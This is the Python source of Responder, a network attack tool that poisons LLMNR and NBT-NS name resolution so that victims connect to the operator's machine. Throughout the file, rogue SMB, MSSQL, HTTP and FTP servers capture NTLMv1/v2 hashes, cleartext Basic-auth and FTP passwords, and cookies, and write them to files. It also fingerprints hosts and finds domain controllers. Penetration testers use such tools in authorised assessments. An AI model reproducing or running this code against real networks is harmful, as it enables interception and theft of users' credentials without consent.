#! /usr/bin/env python
# NBT-NS/LLMNR Responder
# Created by Laurent Gaffie
# Copyright (C) 2012 Trustwave Holdings, Inc.
#
# This program is free software: you can redistribute it and/or modify
# it under the terms of the GNU General Public License as published by
# the Free Software Foundation, either version 3 of the License, or
# (at your option) any later version.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
# 
# You should have received a copy of the GNU General Public License
# along with this program.  If not, see <http://www.gnu.org/licenses/>.

import sys,struct,SocketServer,re,optparse,socket,thread,Fingerprint,random
from Fingerprint import RunSmbFinger,OsNameClientVersion
from odict import OrderedDict
from socket import inet_aton
from random import randrange

parser = optparse.OptionParser(usage='python %prog -i 10.20.30.40 -b 1 -s On -r 0',
                               prog=sys.argv[0],
                               )
parser.add_option('-i','--ip', action="store", help="The ip address to redirect the traffic to. (usually yours)", metavar="10.20.30.40",dest="OURIP")

parser.add_option('-b', '--basic',action="store", help="Set this to 1 if you want to return a Basic HTTP authentication. 0 will return an NTLM authentication.This option is mandatory.", metavar="0",dest="Basic", choices=['0','1'], default="0")

parser.add_option('-s', '--http',action="store", help="Set this to On or Off to start/stop the HTTP server. Default value is On", metavar="Off",dest="on_off", choices=['On','Off'], default="On")

parser.add_option('-S', '--smb',action="store", help="Set this to On or Off to start/stop the SMB server. Default value is On", metavar="Off",dest="SMB_on_off", choices=['On','Off'], default="On")

parser.add_option('-q', '--sql',action="store", help="Set this to On or Off to start/stop the SQL server. Default value is On", metavar="Off",dest="SQL_on_off", choices=['On','Off'], default="On")

parser.add_option('-r', '--wredir',action="store", help="Set this to enable answers for netbios wredir suffix queries. Answering to wredir will likely break stuff on the network (like classics 'nbns spoofer' will). Default value is therefore set to Off (0)", metavar="0",dest="Wredirect", choices=['1','0'], default="0")

parser.add_option('-c','--challenge', action="store", dest="optChal", help = "The server challenge to set for NTLM authentication.  If not set, then defaults to 1122334455667788, the most common challenge for existing Rainbow Tables", metavar="1122334455667788", default="1122334455667788")

parser.add_option('-l','--logfile', action="store", dest="sessionLog", help = "Log file to use for Responder session. ", metavar="Responder-Session.log", default="Responder-Session.log")

parser.add_option('-f','--fingerprint', action="store", dest="Finger", help = "This option allows you to fingerprint a host that issued an NBT-NS or LLMNR query.", metavar="Off", choices=['On','Off'], default="Off")

parser.add_option('-F','--ftp', action="store", dest="FTP_On_Off", help = "Set this to On or Off to start/stop the FTP server. Default value is On", metavar="On", choices=['On','Off'], default="On")


options, args = parser.parse_args()

if options.OURIP is None:
   print "-i mandatory option is missing\n"
   parser.print_help()
   exit(-1)

if len(options.optChal) is not 16:
   print "The challenge must be exactly 16 chars long.\nExample: -c 1122334455667788\n"
   parser.print_help()
   exit(-1)

#Logger
import logging
logging.basicConfig(filename=str(options.sessionLog),level=logging.INFO,format='%(asctime)s %(message)s', datefmt='%m/%d/%Y %I:%M:%S %p')
logging.warning('Responder Started')

# Set some vars.
OURIP = options.OURIP
Basic = options.Basic
On_Off = options.on_off.upper()
SMB_On_Off = options.SMB_on_off.upper()
SQL_On_Off = options.SQL_on_off.upper()
FTP_On_Off = options.FTP_On_Off.upper()
Finger_On_Off = options.Finger.upper()
Wredirect = options.Wredirect
NumChal = options.optChal


def Show_Help(ExtraHelpData):
   help = "NBT Name Service/LLMNR Answerer 1.0.\nPlease send bugs/comments to: lgaffie@trustwave.com\nTo kill this script hit CRTL-C\n"
   help+= ExtraHelpData
   print help

#Function used to write captured hashs to a file.
def WriteData(outfile,data):
    with open(outfile,"w") as outf:
         outf.write(data)
	 outf.write("\n")
         outf.close()

# Break out challenge for the hexidecimally challenged.  Also, avoid 2 different challenges by accident.
Challenge = ""
for i in range(0,len(NumChal),2):
    Challenge += NumChal[i:i+2].decode("hex")

Show_Help("[+]NBT-NS & LLMNR answerer started\nGlobal Parameters set:\nChallenge set is: %s\nHTTP Server is:%s\nSMB Server is:%s\nSQL Server is:%s\nFTP Server is:%s\nFingerPrint Module is:%s"%(NumChal,On_Off,SMB_On_Off,SQL_On_Off,FTP_On_Off,Finger_On_Off))

#Simple NBNS Services.
W_REDIRECT   = "\x41\x41\x00"
FILE_SERVER  = "\x43\x41\x00"


#Packet class handling all packet generation (see odict.py).
class Packet():
    fields = OrderedDict([
        ("data", ""),
    ])
    def __init__(self, **kw):
        self.fields = OrderedDict(self.__class__.fields)
        for k,v in kw.items():
            if callable(v):
                self.fields[k] = v(self.fields[k])
            else:
                self.fields[k] = v
    def __str__(self):
        return "".join(map(str, self.fields.values()))

#Function name self-explanatory
def Is_Finger_On(Finger_On_Off):
    if Finger_On_Off == "ON":
       return True
    if Finger_On_Off == "OFF":
       return False

##################################################################################
#NBT NS Stuff
##################################################################################

#NBT-NS answer packet.
class NBT_Ans(Packet):
    fields = OrderedDict([
        ("Tid",           ""),
        ("Flags",         "\x85\x00"),
        ("Question",      "\x00\x00"),
        ("AnswerRRS",     "\x00\x01"),
        ("AuthorityRRS",  "\x00\x00"),
        ("AdditionalRRS", "\x00\x00"),
        ("NbtName",       ""),
        ("Type",          "\x00\x20"),
        ("Classy",        "\x00\x01"),
        ("TTL",           "\x00\x00\x00\xa5"),  
        ("Len",           "\x00\x06"),  
        ("Flags1",        "\x00\x00"),  
        ("IP",            "\x00\x00\x00\x00"),                      
    ])

    def calculate(self,data):
        self.fields["Tid"] = data[0:2]
        self.fields["NbtName"] = data[12:46]
        self.fields["IP"] = inet_aton(OURIP)

# Define what are we answering to.
def Validate_NBT_NS(data,Wredirect):
    if FILE_SERVER == data[43:46]:
       return True
    if Wredirect == "1":
       if W_REDIRECT == data[43:46]:
          return True
    else:
       return False

# NBT_NS Server class.
class NB(SocketServer.BaseRequestHandler):
    def server_bind(self):
       self.socket.setsockopt(SOL_SOCKET, SO_REUSEADDR,SO_REUSEPORT, 1)
       self.socket.bind(self.server_address)
       self.socket.setblocking(0)

    def handle(self):
        request, socket = self.request
        data = request
        if data[2:4] == "\x01\x10":
           if Validate_NBT_NS(data,Wredirect):
              buff = NBT_Ans()
              buff.calculate(data)
              for x in range(1):
                 socket.sendto(str(buff), self.client_address)
              print "NBT-NS Answer sent to: ", self.client_address[0]
              logging.warning('NBT-NS Answer sent to: %s'%(self.client_address[0]))
              if Is_Finger_On(Finger_On_Off):
                 try:
                    Finger = RunSmbFinger((self.client_address[0],445))
                    logging.warning('[+] OsVersion is:%s'%(Finger[0]))
                    logging.warning('[+] ClientVersion is :%s'%(Finger[1]))
                 except Exception:
                    logging.warning('[+] Fingerprint failed for host: %s'%(self.client_address[0]))
                    pass

##################################################################################
#Browser Listener
##################################################################################
def FindPDC(data,Client):
    DataOffset = struct.unpack('<H',data[139:141])[0]
    BrowserPacket = data[82+DataOffset:]
    if BrowserPacket[0] == "\x0c":
       Domain = ''.join(tuple(BrowserPacket[6:].split('\x00'))[:1])
       if Domain == "WORKGROUP":
          print "[Browser]Received announcement for Workgroup.. ignoring"
       elif Domain == "MSHOME":
          print "[Browser]Received announcement for MSHOME.. ignoring"
       else:
          print "[Browser]PDC ip address is: ",Client
          logging.warning('[Browser] PDC ip address is: %s'%(Client))
          print "[Browser]PDC Domain Name is: ", Domain
          logging.warning('[Browser]PDC Domain Name is: %s'%(Domain))
          ServerName = BrowserPacket[6+16+10:]
          print "[Browser]PDC Machine Name is: ", ServerName
          logging.warning('[Browser]PDC Machine Name is: %s'%(ServerName))
    else:
       pass

class Browser(SocketServer.BaseRequestHandler):
    def server_bind(self):
       self.socket.setsockopt(SOL_SOCKET, SO_REUSEADDR,SO_REUSEPORT, 1)
       self.socket.bind(self.server_address)
       self.socket.setblocking(0)

    def handle(self):
        request, socket = self.request
        FindPDC(request,self.client_address[0])

##################################################################################
#SMB Server
##################################################################################
from SMBPackets import *

#Detect if SMB auth was Anonymous
def Is_Anonymous(data):
    SecBlobLen = struct.unpack('<H',data[51:53])[0]
    if SecBlobLen < 220:
       SSPIStart = data[75:]
       LMhashLen = struct.unpack('<H',data[89:91])[0]
       if LMhashLen == 0 or LMhashLen == 1:
          return True
       else:
          return False
    if SecBlobLen > 220:
       SSPIStart = data[79:]
       LMhashLen = struct.unpack('<H',data[93:95])[0]
       if LMhashLen == 0 or LMhashLen == 1:
          return True
       else:
          return False

#Function used to know which dialect number to return for NT LM 0.12
def Parse_Nego_Dialect(data):
    DialectStart = data[40:]
    pack = tuple(DialectStart.split('\x02'))[:10]
    var = [e.replace('\x00','') for e in DialectStart.split('\x02')[:10]]
    test = tuple(var)
    if test[0] == "NT LM 0.12":
       return "\x00\x00"
    if test[1] == "NT LM 0.12":
       return "\x01\x00"
    if test[2] == "NT LM 0.12":
       return "\x02\x00"
    if test[3] == "NT LM 0.12":
       return "\x03\x00"
    if test[4] == "NT LM 0.12":
       return "\x04\x00"
    if test[5] == "NT LM 0.12":
       return "\x05\x00"
    if test[6] == "NT LM 0.12":
       return "\x06\x00"
    if test[7] == "NT LM 0.12":
       return "\x07\x00"
    if test[8] == "NT LM 0.12":
       return "\x08\x00"
    if test[9] == "NT LM 0.12":
       return "\x09\x00"
    if test[10] == "NT LM 0.12":
       return "\x0a\x00"

def ParseShare(data):
    packet = data[:]
    a = re.search('(\\x5c\\x00\\x5c.*.\\x00\\x00\\x00)', packet)
    if a:
       quote = "Share requested: "+a.group(0)
       print quote.replace('\x00','')
       logging.warning(quote.replace('\x00',''))

def ParseSMBHash(data,client):
    SecBlobLen = struct.unpack('<H',data[51:53])[0]
    BccLen = struct.unpack('<H',data[61:63])[0]
    if SecBlobLen < 220:
       SSPIStart = data[75:]
       LMhashLen = struct.unpack('<H',data[89:91])[0]
       LMhashOffset = struct.unpack('<H',data[91:93])[0]
       LMHash = SSPIStart[LMhashOffset:LMhashOffset+LMhashLen].encode("hex").upper()
       NthashLen = struct.unpack('<H',data[97:99])[0]
       NthashOffset = struct.unpack('<H',data[99:101])[0]

    if SecBlobLen > 220:
       SSPIStart = data[79:]#LenOfLen set for ASN...
       LMhashLen = struct.unpack('<H',data[93:95])[0]
       LMhashOffset = struct.unpack('<H',data[95:97])[0]
       LMHash = SSPIStart[LMhashOffset:LMhashOffset+LMhashLen].encode("hex").upper()
       NthashLen = struct.unpack('<H',data[101:103])[0]
       NthashOffset = struct.unpack('<H',data[103:105])[0]

    if NthashLen == 24:
       print "[+]SMB-NTLMv1 hash captured from : ",client
       outfile = "SMB-NTLMv1-Client-"+client+".txt"
       NtHash = SSPIStart[NthashOffset:NthashOffset+NthashLen].encode("hex").upper()
       DomainLen = struct.unpack('<H',data[105:107])[0]
       DomainOffset = struct.unpack('<H',data[107:109])[0]
       Domain = SSPIStart[DomainOffset:DomainOffset+DomainLen].replace('\x00','')
       print "Domain is :", Domain
       UserLen = struct.unpack('<H',data[113:115])[0]
       UserOffset = struct.unpack('<H',data[115:117])[0]
       User = SSPIStart[UserOffset:UserOffset+UserLen].replace('\x00','')
       print "User is :", SSPIStart[UserOffset:UserOffset+UserLen].replace('\x00','')
       writehash = User+"::"+Domain+":"+LMHash+":"+NtHash+":"+NumChal
       WriteData(outfile,writehash)
       print "[+]SMB complete hash is :", writehash
       logging.warning('[+]SMB-NTLMv1 complete hash is :%s'%(writehash))

    if NthashLen > 60:
       print "[+]SMB-NTLMv2 hash captured from : ",client
       outfile = "SMB-NTLMv2-Client-"+client+".txt"
       NtHash = SSPIStart[NthashOffset:NthashOffset+NthashLen].encode("hex").upper()
       DomainLen = struct.unpack('<H',data[109:111])[0]
       DomainOffset = struct.unpack('<H',data[111:113])[0]
       Domain = SSPIStart[DomainOffset:DomainOffset+DomainLen].replace('\x00','')
       print "Domain is :", Domain
       UserLen = struct.unpack('<H',data[117:119])[0]
       UserOffset = struct.unpack('<H',data[119:121])[0]
       User = SSPIStart[UserOffset:UserOffset+UserLen].replace('\x00','')
       print "User is :", SSPIStart[UserOffset:UserOffset+UserLen].replace('\x00','')
       writehash = User+"::"+Domain+":"+NumChal+":"+NtHash[:32]+":"+NtHash[32:]
       WriteData(outfile,writehash)
       print "[+]SMB complete hash is :", writehash
       logging.warning('[+]SMB-NTLMv2 complete hash is :%s'%(writehash))

#SMB Server class.
class SMB1(SocketServer.BaseRequestHandler):
    def server_bind(self):
       self.socket.setsockopt(SOL_SOCKET, SO_REUSEADDR,SO_REUSEPORT, 1)
       self.socket.bind(self.server_address)
       self.socket.setblocking(0)
       self.socket.setdefaulttimeout(2)

    def handle(self):
        try:
           while True:
              data = self.request.recv(1024)
              self.request.settimeout(2)
              ##session request 139
              if data[0] == "\x81":
                buffer0 = "\x82\x00\x00\x00"         
                self.request.send(buffer0)
                data = self.request.recv(1024)
             ##Negotiate proto answer.
              if data[8:10] == "\x72\x00":
                # Customize SMB answer.
                head = SMBHeader(cmd="\x72",flag1="\x88", flag2="\x01\xc8", pid=pidcalc(data),mid=midcalc(data))
                t = SMBNegoAns(Dialect=Parse_Nego_Dialect(data))
                t.calculate()
                final = t 
                packet0 = str(head)+str(final)
                buffer0 = longueur(packet0)+packet0  
                self.request.send(buffer0)
                data = self.request.recv(1024)
                ##Session Setup AndX Request
              if data[8:10] == "\x73\x00":
                 head = SMBHeader(cmd="\x73",flag1="\x88", flag2="\x01\xc8", errorcode="\x16\x00\x00\xc0", uid=chr(randrange(256))+chr(randrange(256)),pid=pidcalc(data),tid="\x00\x00",mid=midcalc(data))
                 t = SMBSession1Data(NTLMSSPNtServerChallenge=Challenge)
                 t.calculate()
                 final = t 
                 packet1 = str(head)+str(final)
                 buffer1 = longueur(packet1)+packet1  
                 self.request.send(buffer1)
                 data = self.request.recv(4096)
                 if data[8:10] == "\x73\x00":
                    if Is_Anonymous(data):
                       head = SMBHeader(cmd="\x73",flag1="\x98", flag2="\x01\xc8",errorcode="\x72\x00\x00\xc0",pid=pidcalc(data),tid="\x00\x00",uid=uidcalc(data),mid=midcalc(data))
                       final = SMBSessEmpty()###should always send errorcode="\x72\x00\x00\xc0" account disabled for anonymous logins.
                       packet1 = str(head)+str(final)
                       buffer1 = longueur(packet1)+packet1  
                       self.request.send(buffer1)
                    else:
                       ParseSMBHash(data,self.client_address[0])
                       head = SMBHeader(cmd="\x73",flag1="\x98", flag2="\x01\xc8", errorcode="\x00\x00\x00\x00",pid=pidcalc(data),tid=tidcalc(data),uid=uidcalc(data),mid=midcalc(data))
                       final = SMBSession2Accept()
                       final.calculate()
                       packet2 = str(head)+str(final)
                       buffer2 = longueur(packet2)+packet2  
                       self.request.send(buffer2)
                       data = self.request.recv(1024)
             ##Tree Connect IPC Answer
              if data[8:10] == "\x75\x00":
                ParseShare(data)
                head = SMBHeader(cmd="\x75",flag1="\x88", flag2="\x01\xc8", errorcode="\x00\x00\x00\x00", pid=pidcalc(data), tid=chr(randrange(256))+chr(randrange(256)), uid=uidcalc(data), mid=midcalc(data))
                t = SMBTreeData()
                t.calculate()
                final = t 
                packet1 = str(head)+str(final)
                buffer1 = longueur(packet1)+packet1  
                self.request.send(buffer1)
                data = self.request.recv(1024)
             ##Tree Disconnect.
              if data[8:10] == "\x71\x00":
                head = SMBHeader(cmd="\x71",flag1="\x98", flag2="\x07\xc8", errorcode="\x00\x00\x00\x00",pid=pidcalc(data),tid=tidcalc(data),uid=uidcalc(data),mid=midcalc(data))
                final = "\x00\x00\x00" 
                packet1 = str(head)+str(final)
                buffer1 = longueur(packet1)+packet1  
                self.request.send(buffer1)
                data = self.request.recv(1024)
             ##NT_CREATE Access Denied.
              if data[8:10] == "\xa2\x00":
                head = SMBHeader(cmd="\xa2",flag1="\x98", flag2="\x07\xc8", errorcode="\x22\x00\x00\xc0",pid=pidcalc(data),tid=tidcalc(data),uid=uidcalc(data),mid=midcalc(data))
                final = "\x00\x00\x00" 
                packet1 = str(head)+str(final)
                buffer1 = longueur(packet1)+packet1  
                self.request.send(buffer1)
                data = self.request.recv(1024)
             ##Trans2 Access Denied.
              if data[8:10] == "\x25\x00":
                head = SMBHeader(cmd="\x25",flag1="\x98", flag2="\x07\xc8", errorcode="\x22\x00\x00\xc0",pid=pidcalc(data),tid=tidcalc(data),uid=uidcalc(data),mid=midcalc(data))
                final = "\x00\x00\x00" 
                packet1 = str(head)+str(final)
                buffer1 = longueur(packet1)+packet1  
                self.request.send(buffer1)
                data = self.request.recv(1024)
             ##LogOff.
              if data[8:10] == "\x74\x00":
                head = SMBHeader(cmd="\x74",flag1="\x98", flag2="\x07\xc8", errorcode="\x22\x00\x00\xc0",pid=pidcalc(data),tid=tidcalc(data),uid=uidcalc(data),mid=midcalc(data))
                final = "\x02\xff\x00\x27\x00\x00\x00" 
                packet1 = str(head)+str(final)
                buffer1 = longueur(packet1)+packet1  
                self.request.send(buffer1)
                data = self.request.recv(1024)

        except Exception:
           pass #no need to print errors..

##################################################################################
#SQL Stuff
##################################################################################
from SQLPackets import *

#This function parse SQL NTLMv1/v2 hash and dump it into a specific file.
def ParseSQLHash(data,client):
    SSPIStart = data[8:]
    LMhashLen = struct.unpack('<H',data[20:22])[0]
    LMhashOffset = struct.unpack('<H',data[24:26])[0]
    LMHash = SSPIStart[LMhashOffset:LMhashOffset+LMhashLen].encode("hex").upper()
    NthashLen = struct.unpack('<H',data[30:32])[0]
    if NthashLen == 24:
       print "[+]MSSQL NTLMv1 hash captured from :",client
       logging.warning('[+]MsSQL NTLMv1 hash captured from :%s'%(client))
       NthashOffset = struct.unpack('<H',data[32:34])[0]
       NtHash = SSPIStart[NthashOffset:NthashOffset+NthashLen].encode("hex").upper()
       DomainLen = struct.unpack('<H',data[36:38])[0]
       DomainOffset = struct.unpack('<H',data[40:42])[0]
       Domain = SSPIStart[DomainOffset:DomainOffset+DomainLen].replace('\x00','')
       print "Domain is :", Domain
       logging.warning('[+]MSSQL NTLMv1 Domain is :%s'%(Domain))
       UserLen = struct.unpack('<H',data[44:46])[0]
       UserOffset = struct.unpack('<H',data[48:50])[0]
       User = SSPIStart[UserOffset:UserOffset+UserLen].replace('\x00','')
       print "User is :", SSPIStart[UserOffset:UserOffset+UserLen].replace('\x00','')
       logging.warning('[+]MSSQL NTLMv1 User is :%s'%(SSPIStart[UserOffset:UserOffset+UserLen].replace('\x00','')))
       outfile = "MSSQL-NTLMv1-Client-"+client+".txt"
       WriteData(outfile,User+"::"+Domain+":"+LMHash+":"+NtHash+":"+NumChal)
       print '[+]MSSQL NTLMv1 Complete hash is: %s'%(User+"::"+Domain+":"+LMHash+":"+NtHash+":"+NumChal)
       logging.warning('[+]MSSQL NTLMv1 Complete hash is: %s'%(User+"::"+Domain+":"+LMHash+":"+NtHash+":"+NumChal))
    if NthashLen > 60:
       print "[+]MSSQL NTLMv2 Hash captured from :",client
       logging.warning('[+]MsSQL NTLMv2 hash captured from :%s'%(client))
       DomainLen = struct.unpack('<H',data[36:38])[0]
       NthashOffset = struct.unpack('<H',data[32:34])[0]
       NthashLen = struct.unpack('<H',data[30:32])[0]
       Hash = SSPIStart[NthashOffset:NthashOffset+NthashLen].encode("hex").upper()
       DomainOffset = struct.unpack('<H',data[40:42])[0]
       Domain = SSPIStart[DomainOffset:DomainOffset+DomainLen].replace('\x00','')
       print "Domain is :", Domain
       logging.warning('[+]MSSQL NTLMv2 Domain is :%s'%(Domain))
       UserLen = struct.unpack('<H',data[44:46])[0]
       UserOffset = struct.unpack('<H',data[48:50])[0]
       User = SSPIStart[UserOffset:UserOffset+UserLen].replace('\x00','')
       print "User is :", SSPIStart[UserOffset:UserOffset+UserLen].replace('\x00','')
       logging.warning('[+]MSSQL NTLMv2 User is :%s'%(SSPIStart[UserOffset:UserOffset+UserLen].replace('\x00','')))
       outfile = "MSSQL-NTLMv2-Client-"+client+".txt"
       Writehash = User+"::"+Domain+":"+NumChal+":"+Hash[:32].upper()+":"+Hash[32:].upper()
       WriteData(outfile,Writehash)
       print "[+]MSSQL NTLMv2 Complete Hash is : ", Writehash
       logging.warning('[+]MSSQL NTLMv2 Complete Hash is : %s'%(Writehash))

#MS-SQL server class.
class MSSQL(SocketServer.BaseRequestHandler):
    def server_bind(self):
       self.socket.setsockopt(SOL_SOCKET, SO_REUSEADDR,SO_REUSEPORT, 1)
       self.socket.bind(self.server_address)
       self.socket.setblocking(0)
       self.socket.setdefaulttimeout(0.1)

    def handle(self):
        try:
           while True:
              data = self.request.recv(1024)
              self.request.settimeout(0.1)
              ##Pre-Login Message
              if data[0] == "\x12":
                buffer0 = str(MSSQLPreLoginAnswer())        
                self.request.send(buffer0)
                data = self.request.recv(1024)
             ##NegoSSP
              if data[0] == "\x10":
                t = MSSQLNTLMChallengeAnswer(ServerChallenge=Challenge)
                t.calculate()
                buffer1 = str(t) 
                self.request.send(buffer1)
                data = self.request.recv(1024)
                ##NegoSSP Auth
              if data[0] == "\x11":
                 ParseSQLHash(data,self.client_address[0])
        except Exception:
           pass
           self.request.close()

##################################################################################
#LLMNR Stuff
##################################################################################

#LLMNR Answer packet.
class LLMNRAns(Packet):
    fields = OrderedDict([
        ("Tid",              ""),
        ("Flags",            "\x80\x00"),
        ("Question",         "\x00\x01"),
        ("AnswerRRS",        "\x00\x01"),
        ("AuthorityRRS",     "\x00\x00"),
        ("AdditionalRRS",    "\x00\x00"),
        ("QuestionNameLen",  "\x09"),
        ("QuestionName",     ""),
        ("QuestionNameNull", "\x00"),
        ("Type",             "\x00\x01"),
        ("Class",            "\x00\x01"),
        ("AnswerNameLen",    "\x09"),  
        ("AnswerName",       ""),
        ("AnswerNameNull",   "\x00"),    
        ("Type1",            "\x00\x01"),  
        ("Class1",           "\x00\x01"),
        ("TTL",              "\x00\x00\x00\x1e"),##Poison for 30 sec.
        ("IPLen",            "\x00\x04"),
        ("IP",               "\x00\x00\x00\x00"),
    ])

    def calculate(self):
        self.fields["IP"] = inet_aton(OURIP)
        self.fields["IPLen"] = struct.pack(">h",len(self.fields["IP"]))
        self.fields["AnswerNameLen"] = struct.pack(">h",len(self.fields["AnswerName"]))[1]
        self.fields["QuestionNameLen"] = struct.pack(">h",len(self.fields["QuestionName"]))[1]

def Parse_LLMNR_Name(data,addr):
   NameLen = struct.unpack('>B',data[12])[0]
   Name = data[13:13+NameLen]
   print "LLMNR poisoned answer sent to this IP: %s. The requested name was : %s."%(addr[0],Name)
   logging.warning('LLMNR poisoned answer sent to this IP: %s. The requested name was : %s.'%(addr[0],Name))
   return Name

def Parse_IPV6_Addr(data):
    Len = len(data)
    if data[Len-4:Len][1] =="\x1c":
       return False
    else:
       return True

def RunLLMNR():
   ALL = "0.0.0.0"
   MADDR = "224.0.0.252"
   MPORT = 5355
   sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM, socket.IPPROTO_UDP)
   sock.setsockopt(socket.SOL_SOCKET,socket.SO_REUSEADDR,1)
   sock.bind((ALL,MPORT))
   sock.setsockopt(socket.IPPROTO_IP, socket.IP_MULTICAST_TTL, 255)
   ## Join IGMP Group.
   Join = sock.setsockopt(socket.IPPROTO_IP,socket.IP_ADD_MEMBERSHIP,inet_aton(MADDR) + inet_aton(ALL))
   while True:
       try:
          data, addr = sock.recvfrom(1024)
          if data[2:4] == "\x00\x00":
             if Parse_IPV6_Addr(data):
                global Name
                Name = Parse_LLMNR_Name(data,addr)
                buff = LLMNRAns(Tid=data[0:2],QuestionName=Name, AnswerName=Name)
                buff.calculate()
                for x in range(1):
                   sock.sendto(str(buff), addr)
                if Is_Finger_On(Finger_On_Off):
                   try:
                      Finger = RunSmbFinger((addr[0],445))
                      logging.warning('[+] OsVersion is:%s'%(Finger[0]))
                      logging.warning('[+] ClientVersion is :%s'%(Finger[1]))
                   except Exception:
                      logging.warning('[+] Fingerprint failed for host: %s'%(addr[0]))
                      pass
       except:
          raise

##################################################################################
#HTTP Stuff
##################################################################################
from HTTPPackets import *

#Parse NTLMv1/v2 hash.
def ParseHTTPHash(data,client):
    LMhashLen = struct.unpack('<H',data[12:14])[0]
    LMhashOffset = struct.unpack('<H',data[16:18])[0]
    LMHash = data[LMhashOffset:LMhashOffset+LMhashLen].encode("hex").upper()
    NthashLen = struct.unpack('<H',data[20:22])[0]
    NthashOffset = struct.unpack('<H',data[24:26])[0]
    NTHash = data[NthashOffset:NthashOffset+NthashLen].encode("hex").upper()
    if NthashLen == 24:
       print "[+]HTTP NTLMv1 hash captured from :",client
       logging.warning('[+]HTTP NTLMv1 hash captured from :%s'%(client))
       NtHash = data[NthashOffset:NthashOffset+NthashLen].encode("hex").upper()
       HostNameLen = struct.unpack('<H',data[46:48])[0]
       HostNameOffset = struct.unpack('<H',data[48:50])[0]
       Hostname = data[HostNameOffset:HostNameOffset+HostNameLen].replace('\x00','')
       print "Hostname is :", Hostname
       logging.warning('[+]HTTP NTLMv1 Hostname is :%s'%(Hostname))
       UserLen = struct.unpack('<H',data[36:38])[0]
       UserOffset = struct.unpack('<H',data[40:42])[0]
       User = data[UserOffset:UserOffset+UserLen].replace('\x00','')
       print "User is :", data[UserOffset:UserOffset+UserLen].replace('\x00','')
       logging.warning('[+]HTTP NTLMv1 User is :%s'%(data[UserOffset:UserOffset+UserLen].replace('\x00','')))
       outfile = "HTTP-NTLMv1-Client-"+client+".txt"
       WriteHash = User+"::"+Hostname+":"+LMHash+":"+NtHash+":"+NumChal
       WriteData(outfile,WriteHash)
       print "Complete hash is : ", WriteHash
       logging.warning('[+]HTTP NTLMv1 Complete hash is :%s'%(WriteHash))
    if NthashLen > 24:
       print "[+]HTTP NTLMv2 hash captured from :",client
       logging.warning('[+]HTTP NTLMv2 hash captured from :%s'%(client))
       NthashLen = 64
       DomainLen = struct.unpack('<H',data[28:30])[0]
       DomainOffset = struct.unpack('<H',data[32:34])[0]
       Domain = data[DomainOffset:DomainOffset+DomainLen].replace('\x00','')
       print "Domain is : ", Domain
       logging.warning('[+]HTTP NTLMv2 Domain is :%s'%(Domain))
       UserLen = struct.unpack('<H',data[36:38])[0]
       UserOffset = struct.unpack('<H',data[40:42])[0]
       User = data[UserOffset:UserOffset+UserLen].replace('\x00','')
       print "User is :", User
       logging.warning('[+]HTTP NTLMv2 User is : %s'%(User))
       HostNameLen = struct.unpack('<H',data[44:46])[0]
       HostNameOffset = struct.unpack('<H',data[48:50])[0]
       HostName =  data[HostNameOffset:HostNameOffset+HostNameLen].replace('\x00','')
       print "Hostname is :", HostName
       logging.warning('[+]HTTP NTLMv2 Hostname is :%s'%(HostName))
       outfile = "HTTP-NTLMv2-Client-"+client+".txt"
       WriteHash = User+"::"+Domain+":"+NumChal+":"+NTHash[:32]+":"+NTHash[32:]
       WriteData(outfile,WriteHash)
       print "Complete hash is : ", WriteHash
       logging.warning('[+]HTTP NTLMv2 Complete hash is :%s'%(WriteHash))

def GrabCookie(data,host):
    Cookie = re.search('(Cookie:*.\=*)[^\r\n]*', data)
    if Cookie:
          CookieStr = "[+]HTTP Cookie Header sent from: %s was: %s"%(host,Cookie.group(0))
          logging.warning(CookieStr)
          print CookieStr
    else:
          NoCookies = "[+]No cookies were sent with this request"
          logging.warning(NoCookies)

# Function used to check if we answer with a Basic or NTLM auth. 
def Basic_Ntlm(Basic):
    if Basic == "1":
       return IIS_Basic_401_Ans()
    if Basic == "0":
       return IIS_Auth_401_Ans()

#Handle HTTP packet sequence.
def PacketSequence(data,client):
    a = re.findall('(?<=Authorization: NTLM )[^\\r]*', data)
    b = re.findall('(?<=Authorization: Basic )[^\\r]*', data)

    if a:
       packetNtlm = b64decode(''.join(a))[8:9]
       if packetNtlm == "\x01":
          GrabCookie(data,client)
          r = NTLM_Challenge(ServerChallenge=Challenge)
          r.calculate()
          t = IIS_NTLM_Challenge_Ans()
          t.calculate(str(r))
          buffer1 = str(t)                    
          return buffer1
       if packetNtlm == "\x03":
          NTLM_Auth= b64decode(''.join(a))
          ParseHTTPHash(NTLM_Auth,client)
    if b:
       GrabCookie(data,client)
       outfile = "HTTP-Clear-Text-Password-"+client+".txt"
       WriteData(outfile,b64decode(''.join(b)))
       print "[+]HTTP-User & Password:", b64decode(''.join(b))
       logging.warning('[+]HTTP-User & Password: %s'%(b64decode(''.join(b))))

    else:
       return str(Basic_Ntlm(Basic))

#HTTP Server Class
class HTTP(SocketServer.BaseRequestHandler):
    def server_bind(self):
       self.socket.setsockopt(SOL_SOCKET, SO_REUSEADDR,SO_REUSEPORT, 1)
       self.socket.bind(self.server_address)
       self.socket.setblocking(0)
       self.socket.setdefaulttimeout(1)

    def handle(self):
        try:
             
            for x in range(2):
              data = self.request.recv(8092)
              buffer0 = PacketSequence(data,self.client_address[0])      
              self.request.send(buffer0)
        except Exception:
           pass#No need to be verbose..
           self.request.close()

##################################################################################
#FTP Stuff
##################################################################################
class FTPPacket(Packet):
    fields = OrderedDict([
        ("Code",           "220"),
        ("Separator",      "\x20"),
        ("Message",        "Welcome"),
        ("Terminator",     "\x0d\x0a"),                     
    ])

#FTP server class.
class FTP(SocketServer.BaseRequestHandler):
    def server_bind(self):
       self.socket.setsockopt(SOL_SOCKET, SO_REUSEADDR,SO_REUSEPORT, 1)
       self.socket.bind(self.server_address)
       self.socket.setblocking(0)
       self.socket.setdefaulttimeout(1)

    def handle(self):
        try:
          self.request.send(str(FTPPacket()))
          data = self.request.recv(1024)
          if data[0:4] == "USER":
             User = data[5:].replace("\r\n","")
             print "[+]FTP User: ", User
             logging.warning('[+]FTP User: %s'%(User))
             t = FTPPacket(Code="331",Message="User name okay, need password.")
             self.request.send(str(t))
             data = self.request.recv(1024)
          if data[0:4] == "PASS":
             Pass = data[5:].replace("\r\n","")
             Outfile = "FTP-Clear-Text-Password-"+self.client_address[0]+".txt"
             WriteData(Outfile,User+":"+Pass)
             print "[+]FTP Password is: ", Pass
             logging.warning('[+]FTP Password is: %s'%(Pass))
             t = FTPPacket(Code="530",Message="User not logged in.")
             self.request.send(str(t))
